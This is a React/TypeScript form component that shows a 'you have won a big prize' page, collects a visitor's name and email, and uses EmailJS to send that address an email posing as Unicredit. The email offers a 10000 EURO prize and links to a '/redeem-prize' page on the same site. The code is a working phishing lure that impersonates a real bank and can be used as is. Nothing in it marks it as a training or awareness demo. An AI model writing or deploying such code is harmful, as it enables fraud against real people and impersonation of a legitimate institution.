import {getFormattedNowDate} from "../utils/DateTimeUtils.ts";
import emailjs from "@emailjs/browser";
import {type ChangeEvent, useState} from "react";
import {capitalize} from "../utils/StringUtils.ts";

const EMAILJS_SERVICE_ID = 'contact_service';
const EMAILJS_TEMPLATE_ID = 'contact_form';
const prize = 10000;

function Form() {
    const [userEmail, setUserEmail] = useState('');
    const [userName, setUserName] = useState('');

    function handleOnUserEmailChange(e: ChangeEvent<HTMLInputElement>) {
        setUserEmail(e.target.value);
    }

    function handleOnUserNameChange(e: ChangeEvent<HTMLInputElement>) {
        setUserName(e.target.value);
    }

    async function handleOnSubmit() {
        const emailTemplateParams = {
            destination: userEmail,
            fromname: 'Unicredit',
            name: capitalize(userName.split(' ')[0]),
            title: 'Redeem your 10000 EURO prize',
            time: getFormattedNowDate(),
            message: `Congrats! Redeem your prize here: ${window.location.origin}/redeem-prize`,
        }

        try {
            console.log(`Sending mail to ${emailTemplateParams.destination}`)
            await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, emailTemplateParams);
            console.log('Email sent successfully');
        } catch (e) {
            console.log(e);
        }
    }

    return (
        <div>
            <p className="mb-3 text-lg text-gray-500 md:text-xl">
                OMG! <br /> You have been selected to win a big prize!
            </p>
            <p className="text-gray-500 mb-5">
                Complete the form below to get the information on how to
                redeem your prize of { prize } EURO.
            </p>

            <form>
                <div className="mb-5">
                    <label
                        htmlFor="email"
                        className="block mb-2 text-sm font-medium text-gray-900">
                        Your email
                    </label>
                    <input
                        onChange={handleOnUserEmailChange}
                        type="email"
                        id="email"
                        className="bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded-lg focus:ring-blue-500 focus:border-blue-500 block w-full p-2.5"
                        placeholder="Enter your e-mail"
                        value={userEmail}
                        required
                    />
                </div>

                <div className="mb-5">
                    <label
                        htmlFor="name"
                        className="block mb-2 text-sm font-medium text-gray-900">
                        Your name
                    </label>
                    <input
                        onChange={handleOnUserNameChange}
                        type="text"
                        id="name"
                        className="bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded-lg focus:ring-blue-500 focus:border-blue-500 block w-full p-2.5"
                        value={userName}
                        required
                    />
                </div>

                <div className="flex items-start mb-5">
                    <div className="flex items-center h-5">
                        <input
                            id="remember"
                            type="checkbox"
                            value=""
                            className="w-4 h-4 border border-gray-300 rounded-sm bg-gray-50 focus:ring-3 focus:ring-blue-300"
                            required
                        />
                    </div>
                    <label
                        htmlFor="remember"
                        className="ms-2 text-sm font-medium text-gray-900">
                        Remember me
                    </label>
                </div>

                <button
                    onClick={handleOnSubmit}
                    type="submit"
                    className="text-white bg-blue-700 hover:bg-blue-800 focus:ring-4 focus:outline-none focus:ring-blue-300 font-medium rounded-lg text-sm w-full sm:w-auto px-5 py-2.5 text-center">
                    Submit
                </button>
            </form>
        </div>
    );
}

export default Form;